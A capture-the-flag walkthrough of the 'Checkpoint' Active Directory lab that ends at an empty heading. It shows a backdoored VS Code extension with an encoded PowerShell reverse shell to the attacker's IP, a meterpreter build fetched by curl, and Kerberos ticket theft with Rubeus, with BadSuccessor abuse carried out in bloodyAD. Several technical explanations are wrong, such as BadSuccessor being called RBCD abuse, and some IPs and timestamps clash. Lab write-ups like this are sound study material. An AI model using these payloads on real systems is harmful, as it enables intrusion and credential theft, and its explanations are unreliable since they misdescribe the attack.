---
title: "Checkpoint"
type: docs
tags:
  - Medium
---

## Nmap scan

```bash
Nmap scan report for checkpoint.htb (10.129.112.233)
Host is up, received user-set (0.024s latency).
Scanned at 2026-09-03 02:07:14 EDT for 187s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           REASON  VERSION
53/tcp    open  domain            syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2026-09-03 13:09:32Z)
135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack
464/tcp   open  kpasswd5?         syn-ack
593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack
3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack
5985/tcp  open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-headers: 
|   Content-Type: text/html; charset=us-ascii
|   Server: Microsoft-HTTPAPI/2.0
|   Date: Thu, 03 Sep 2026 13:10:21 GMT
|   Connection: close
|   Content-Length: 315
|   
|_  (Request type: GET)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
49664/tcp open  msrpc             syn-ack Microsoft Windows RPC
49672/tcp open  msrpc             syn-ack Microsoft Windows RPC
49673/tcp open  msrpc             syn-ack Microsoft Windows RPC
49679/tcp open  msrpc             syn-ack Microsoft Windows RPC
49680/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc             syn-ack Microsoft Windows RPC
49710/tcp open  msrpc             syn-ack Microsoft Windows RPC
49719/tcp open  msrpc             syn-ack Microsoft Windows RPC
```


Since this engagement started with assumed-breach credentials for `alex.turner`, my first move was to confirm those creds actually worked and then map out what that account could reach over SMB. Enumerating shares before anything else gives me a quick sense of what data or write access might already be sitting within reach, without needing to touch any exploit at all.

```bash
└─[$] smbmap  -H 10.129.112.227  -u 'alex.turner' -p 'Checkpoint2024!'

[+] IP: 10.129.112.227:445	Name: checkpoint.htb      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	READ ONLY	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	NO ACCESS	

```


## Initial Access

Share access alone did not give me a way in yet, so I shifted my focus to the directory itself. In an Active Directory environment, write permissions on objects are frequently a bigger lever than file share access, so I wanted to see exactly what `alex.turner` had rights to modify anywhere in the domain before deciding on a next step.

```bash
[$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable     [3:02:41]

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

That output was immediately interesting: nestled in among the writable objects was a deleted user, `Mark Davies`, sitting in the Deleted Objects container, and `alex.turner` had WRITE permission over it. Deleted AD objects are not always as gone as they look, and if I could write to that tombstoned object, I had a real shot at bringing the account itself back to life. I went ahead and restored it.

```bash
└─[$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

```bash
└─[$] nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!' --shares                                      [3:07:36]

SMB         10.129.112.233  445    DC01             [*] Windows 10.0 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.233  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.112.233  445    DC01             [*] Enumerated shares
SMB         10.129.112.233  445    DC01             Share           Permissions     Remark
SMB         10.129.112.233  445    DC01             -----           -----------     ------
SMB         10.129.112.233  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.112.233  445    DC01             C$                              Default share
SMB         10.129.112.233  445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.112.233  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.112.233  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.112.233  445    DC01             SYSVOL          READ            Logon server share 

```

With the account restored, I checked what `mark.davies` could reach over SMB, and this time the picture had changed meaningfully: unlike `alex.turner`, this account had full read and write access to the `DevDrop` share.

Write access on its own does not get me code execution, so I needed to think about who actually consumes the files placed in that share. The share's description explicitly mentioned approved `.vsix` packages for VS Code, which told me there was very likely an automated process on the other end that installs whatever extension shows up there, and VS Code extensions are just JavaScript running with the privileges of whoever opens the editor. That gave me a clear plan: find a legitimate-looking `.vsix` package, weaponize it, and drop it in the share for that process to pick up. It took some digging through public samples before I landed on a suitable base package to work from, which I sourced [from this repository](https://github.com/yeeth-security/vsix-zoo/blob/main/samples/thesevibesareoff/solidityai.solidity-1.0.9.vsix).

A `.vsix` file is really just a zip archive under the hood, so extracting it gave me direct access to the extension's source files to modify.

```bash
└─[$] unzip solidityai.solidity-1.0.9.vsix                                                                       [3:48:10]
Archive:  solidityai.solidity-1.0.9.vsix
  inflating: extension.vsixmanifest  
  inflating: [Content_Types].xml     
  inflating: extension/tsconfig.json  
  inflating: extension/readme.md     
  inflating: extension/package.json  
  inflating: extension/LICENSE.md    
  inflating: extension/icon.png      
  inflating: extension/src/extension.js  
```

The activation logic lives in `extension/src/extension.js`, so that was the one file I actually needed to touch. I edited it to check for a Windows host, wait a couple of seconds so the extension has time to load cleanly, and then quietly execute a base64-encoded PowerShell reverse shell payload in the background.

```bash
└─[$] cat extension.js                                                                                           [3:52:21]
const vscode = require('vscode');
const { exec } = require('child_process');

/**
 * @param {vscode.ExtensionContext} context
 */
async function activate(context) {
    if (process.platform !== 'win32') {
        return;
    }
    setTimeout(() => {
        const psCommand = 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANQA5ACIALAA5ADAAMAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
        exec(psCommand, { windowsHide: true }, (err) => {});
    }, 2000);
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};
```

With the payload embedded, I repackaged everything back into a valid `.vsix` archive and pushed it to the writable share, betting that whatever process reviews or installs packages from `DevDrop` would pick it up automatically.

```bash
└─[$] zip -r baphomet-exploit.zip *                                                                              [3:49:27]
  adding: [Content_Types].xml (deflated 50%)
  adding: extension/ (stored 0%)
  adding: extension/tsconfig.json (deflated 39%)
  adding: extension/package.json (deflated 42%)
  adding: extension/src/ (stored 0%)
  adding: extension/src/extension.js (deflated 50%)
  adding: extension/LICENSE.md (stored 0%)
  adding: extension/readme.md (deflated 68%)
  adding: extension/icon.png (deflated 0%)
  adding: extension.vsixmanifest (deflated 71%)
```

That bet paid off. Not long after the upload, my listener caught a callback, confirming the extension had been picked up and executed exactly as I hoped.

```bash
└─[$] rlwrap nc -lnvvp 9005                                                                                      [3:46:30]
Listening on 0.0.0.0 9005
Connection received on 10.129.112.233 62686

PS C:\Program Files\Microsoft VS Code> 
```

```bash
PS C:\users> whoami
checkpoint\ryan.brooks
```

The shell had landed as `ryan.brooks`, an entirely different account from either of the two I had used so far, which meant this VS Code extension install process runs under its own dedicated identity. With a foothold confirmed, I headed straight to that user's home directory to grab the first flag.

```bash
PS C:\users\ryan.brooks\desktop> type user.txt
91a112fe7b6455406ddcb376ed155205
PS C:\users\ryan.brooks\desktop> 
```

The reverse shell I was working with was fragile, prone to dropping and awkward for running the heavier enumeration tools I needed next, so before going any further I wanted something more resilient to operate from. I generated a `meterpreter` payload to upgrade to a proper, stable session.

```bash
└─[$] msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.59 LPORT=9001 -f exe -o baphomet.exe            [3:54:51]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: baphomet.exe
```

```bash
C:\Users\ryan.brooks> curl http://10.10.17.59:8000/baphomet.exe -O baphomet.exe
PS C:\Users\ryan.brooks> dir


    Directory: C:\Users\ryan.brooks


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         5/21/2026   4:19 PM                .vscode                                                              
d-----         5/21/2026   4:19 PM                .vscode-shared                                                       
d-r---         5/18/2026   6:16 PM                Contacts                                                             
d-r---         5/18/2026   6:16 PM                Desktop                                                              
d-r---         5/18/2026   6:16 PM                Documents                                                            
d-r---         5/18/2026   6:16 PM                Downloads                                                            
d-r---         5/18/2026   6:16 PM                Favorites                                                            
d-r---         5/18/2026   6:16 PM                Links                                                                
d-r---         5/18/2026   6:16 PM                Music                                                                
d-r---         5/18/2026   6:16 PM                Pictures                                                             
d-r---         5/18/2026   6:16 PM                Saved Games                                                          
d-r---         5/18/2026   6:16 PM                Searches                                                             
d-r---         5/18/2026   6:16 PM                Videos                                                               
-a----          9/3/2026   8:00 AM          73802 baphomet.exe                                                         


PS C:\Users\ryan.brooks> start-process baphomet.exe
PS C:\Users\ryan.brooks> 
```

```bash
*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.17.59:9001 

msf6 exploit(multi/handler) > 
[*] Sending stage (177734 bytes) to 10.129.112.233

msf6 exploit(multi/handler) > s[*] Meterpreter session 1 opened (10.10.17.59:9001 -> 10.129.112.233:56817) at 2026-09-03 04:01:51 -0400

msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  CHECKPOINT\ryan.brooks @ DC01  10.10.17.59:9001 -> 10.129.112.233:56817 (10.129.112.
                                                                    233)

msf6 exploit(multi/handler) > 
```

With a stable session in hand, my next priority was building a clear picture of what `ryan.brooks` could actually do inside the domain, rather than continuing to guess. `SharpHound` collects exactly the kind of ACL, group membership, and session data that `BloodHound` needs to visualize privilege escalation paths, so I uploaded the collector and ran it directly on the box.

```powershell

PS C:\Users\ryan.brooks> .\SharpHound.exe
.\SharpHound.exe
2026-09-03T08:08:16.0645188-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-09-03T08:08:16.0985055-07:00|INFORMATION|SharpHound Version: 2.14.0.0
2026-09-03T08:08:16.0985055-07:00|INFORMATION|SharpHound Common Version: 4.7.0.0
2026-09-03T08:08:16.2541230-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-09-03T08:08:16.3057661-07:00|INFORMATION|Initializing SharpHound at 8:08 AM on 9/3/2026
2026-09-03T08:08:16.3932397-07:00|INFORMATION|Resolved current domain to checkpoint.htb
2026-09-03T08:08:28.7061659-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2026-09-03T08:08:28.8687181-07:00|INFORMATION|Beginning LDAP search for checkpoint.htb
2026-09-03T08:08:28.8707303-07:00|INFORMATION|Collecting AdminSDHolder data for checkpoint.htb
2026-09-03T08:08:28.9644640-07:00|INFORMATION|AdminSDHolder ACL hash 8D4B78A3A73E761C2B15363A835DE9FD09981C49 calculated for checkpoint.htb.
```

I never obtained `ryan.brooks`'s plaintext password or hash, so cracking or pass-the-hash was off the table for moving further with this identity. Rather than treating that as a dead end, I turned to ticket-based abuse instead: Rubeus can request a fully usable TGT for the currently logged on user without needing any elevated rights at all, by abusing `GSS-API` to fake a delegation request. That gives me a portable copy of `ryan.brooks`'s ticket that I can carry off the box and reuse from my own attacking machine.

```powershell
PS C:\Users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: K1TXGs7gsIkLKN31UARrEquZhNeC7AfA169VmwGntoI=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuuOitpRwREs1mrW8V81IhorWkKT5Xy7oFSIjtaqtKaCU74YSgFTdAXN3XVn+4okMvdd+cCpgvDJCQOm6lIxoPvUkAsU6+j47Sj+eHLx8WM9WetV3R82EWe/CxOEXx08x28EvAmYWSnX9FZRRubP3JdZOVy+7WtZc+GLA4JEW491Eq4/ZYeALiWXJ0H83J2pJOWgJUhqOzy2M916GSdcT2c7vxgM4XlW1XoyiT0ZYoaHjujXQD3fM6chneHQg0GBlM8UlHeKTMX/51EKMOlrSx2LTHLC1LdTpcpKte8LJdDM0bfno+9B4ioelnv6nY5GxG4lwAxRgooaUM+AtYg556958ApWmTh59G1+HsoERMjhpFSpFIu3TkBVvjlJCrD3AhE6AQ45oy8z9TR2vthxT/VYetFSaQE/H957moq/55RqD8eWtuv8CKMonUOD6X2DpcZakXHR/r3hLzKplWgZYTNIKIxuPVCVwt/xvdOO5C0VhxV+Gr60VCrEcM3NDHWf5FWCAXTKxoDwdynuJx2YJpWJiqcATV4EBV0bpZIoafvpJDkX7m56TxreXWHB4dYHwDrpk2rWivqhePgaA15Jf83R6Y7GxVRK6scCCiHjfFVHxdVktZnRrFLS5vXLddWOdMGWslGvD9gtHxmMweuhgyyhIaAK47lLnAA2qtQZL3i2vHvqJxBkI240wx4NJsYumTPckEpF5cSOM+kPPenPPIhtQpR2QpQZQ4F/HBnf9mtdH1OfFxulRSffIZ3gj1TetaHLACiesmST5ee6ocIY0+NeMCaSQlQGBYQJyFi/tEUy+8+3TJfRK3aYap9JRfx99TKxT9J5GGtGpQNUIgOM8UXQaZOV6TPWC0VYjGEnygEABsjw9xOdZe0Oeq344jjolDFTcMEHSW/S44E7eQf+HEbAnG7GYSD71lBvrrVclmJUbWITc38RvSzAOjDObHm3LyLH7aaDu4csY7MXYf+t136cbIqzkfht03Rnl46a8wmwe12OWDIpjgw2BkHWYMdQVvoKEZ2BFnRLVEYq4FGCc5lDZkAbMmSxxlM0a5mAdGuarvBBaMqus1deYIYINvQCJAh01HHEcd/2Aseis7lKHLud9th0NZY1coRS6Uc1wORIcCEH4vL4VCSaX/YMKwR5Wh8qJYc28UX4KO0GI4A+IJbCZ92WHIHlfXBVEo98KzWB9crnf6kQ1MbgKBYQtRBIe5fdKAgJb8fJM5znLmBlSo2EsYu8Ko7JffyZpO4lHpX12NbzQPtBZkRqUppgLvpQW3dsv/tr/VwGDRngRgPQxHqlxmvu+OCUu5xMVSeViUGrLzDC0WVpsJyQRTgxlEDvqk01Dyvz1OnxVN/tN1Ltb+83BrBpWRT3iwd05MLs7dW0MyyL0IFPetMxxKvuo3g+TberHpIC4pUacdxM+f9+WkbJRJrV05HCRBvKb1ixiWEurHygz91NY/mZI3rnkdCJJ5AbeERkBgff49NFYFkCmgdjGVe7cYBAyfcaiwc0PSo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg2Ez5gyuSjCJs964IrSYHLIGHomlF/6utRfmup4ppZDehEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDkwMzE1MjUzNFqmERgPMjAyNjA5MDQwMTI1MzRapxEYDzIwMjYwOTEwMTUyNTM0WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
PS C:\Users\ryan.brooks> 
```

Rubeus handed the ticket back as a base64 blob rather than a raw file, so before any of my Linux-side tooling could use it, I needed to decode it back into its binary `.kirbi` form.

```bash
└─[$] base64 -d ryan.brooks.kirbi > ryan.brooks2.kirbi 
```

A `.kirbi` file is the Windows/MIT format for a Kerberos ticket, but the Linux tooling I wanted to use next speaks the `ccache` format instead, so I converted it with `impacket-ticketconverter` to bridge that gap.

```bash
└─[$] python3 ~/ADTools/impacket/examples/ticketConverter.py ryan.brooks2.kirbi ryan.brooks.ccache               [4:27:36]
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

The Kerberos tooling on my machine looks for the active ticket via the `KRB5CCNAME` environment variable, so I exported it to point at the converted ccache file, which lets every subsequent Kerberos-aware tool automatically authenticate as `ryan.brooks` without me having to pass credentials by hand each time.

```BASH
└─[$] export KRB5CCNAME=ryan.brooks.ccache 
```

With the ticket in place, my next step was to reach for `bloodyAD` and attempt `BadSuccessor`. I picked this particular technique deliberately: it is a relatively new attack that affects `Windows Server 2025` and earlier, and it hinges on a feature, delegated Managed Service Accounts, that Active Directory environments running that OS version are increasingly likely to have exposed.

### What is badsuccessor?

The technique works by abusing how Active Directory tracks account migration for delegated Managed Service Accounts. If I can create or control a dMSA object and set its `msDS-ManagedAccountPrecededbyLink` attribute to point at an existing high-privilege account, such as a domain admin, Active Directory will treat the dMSA as having "succeeded" that account and grant it the same effective privileges, all without ever touching or modifying the original account itself. It is a clean example of a feature meant for legitimate account migration being repurposed for privilege escalation, and it requires nothing more than the ability to create a dMSA object somewhere in the directory.

Putting that theory into practice meant picking a suitable target account to link against. I settled on the service account `svc_deploy`, because it sits in a location, under `CN=CONFIGURATION`, that Active Directory treats as a Container object (functionally similar to a Group Policy Container), and that placement is exactly what BadSuccessor needs in order to link a new dMSA back to it.

```bash
bloodyAD -k ccache=ryan.brooks.ccache -u 'ryan.brooks' --dc-ip '10.129.112.233' --host dc01.checkpoint.htb -d checkpoint.htb add badSuccessor baphomet -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
Clock skew detected. Adjusting local time by 6:59:59.430645. Retrying operation.
[+] Creating DMSA baphomet$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Clock skew detected. Adjusting local time by 6:59:59.627634. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : baphomet$
UserRealm    : checkpoint.htb
StartTime    : 2026-09-03 15:33:26+00:00
EndTime      : 2026-09-04 01:25:34+00:00
RenewTill    : 2026-09-10 15:25:34+00:00
Flags        : pre-authent, renewable, forwardable, forwarded, enc-pa-rep
Keytype      : 18
Key          : FuaaBXRrxFBAIVW+E8tsFEDzO7yTaCPsQpYO1KmnG5c=
EncodedKirbi : 
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
    Qg==
[+] dMSA TGT stored in ccache file baphomet_1F.ccache

dMSA current keys found in TGS:
AES256: 6b1c4d4a97ce362ebb24b15d470ad00a996db57089058a9dd37fabdfb9767e5f
AES128: fa7d778d88da868b6c61a3ae6b19d7d3
RC4: f9eafc0ab05cd45d266e9c7a07e94399

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

### What are we doing here?

Breaking down what that `bloodyAD` command actually does: it creates a brand new dMSA-backed computer object named `baphomet` in this Active Directory environment, and then links it, via that `msDS-ManagedAccountPrecededbyLink` attribute, to the `svc_deploy` service account. In practice, this is a form of `Resource-Based Constrained Delegation (RBCD)` abuse, a well-established class of domain privilege escalation, repackaged through the newer BadSuccessor mechanic to let my newly minted fake computer account impersonate or otherwise access `svc_deploy`'s privileges.

**`-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"`**: Specifies the **target** (`-t`) object for this operation. In BloodHound/RBCD scenarios, this modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `svc_deploy` user account to trust the newly created `baphomet` computer.

**`--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"`**: Dictates the exact Organization Unit (OU) container path where the new `baphomet` computer object should be physically created and placed.

### Extracting svc_deploy from the dMSA ticket

Creating that dMSA was only half of BadSuccessor, since the actual payoff comes from what the KDC hands back once the dMSA is used, not from the object itself. When `bloodyAD` requested a ticket for `baphomet$`, the response carried a `KERB-DMSA-KEY-PACKAGE` structure, and on a domain that has not fully closed out the migration, that structure's `previous-keys` field discloses a full copy of the preceding account's own cryptographic material. In other words, asking for `baphomet$`'s ticket also handed me `svc_deploy`'s keys, which is the entire bug in one sentence.

```bash
└─[$] export KRB5CCNAME=baphomet_1F.ccache
└─[$] impacket-secretsdump -k -no-pass -just-dc-user svc_deploy 'checkpoint.htb/baphomet$@dc01.checkpoint.htb'
```

That pulled `svc_deploy`'s NT hash straight out of the ticket material without ever touching `svc_deploy`'s own logon. I validated it before relying on it for anything further.

```bash
└─[$] nxc smb dc01.checkpoint.htb -u svc_deploy --pw-nt-hash <svc_deploy NT hash>
```

### From svc_deploy to a domain controller backup

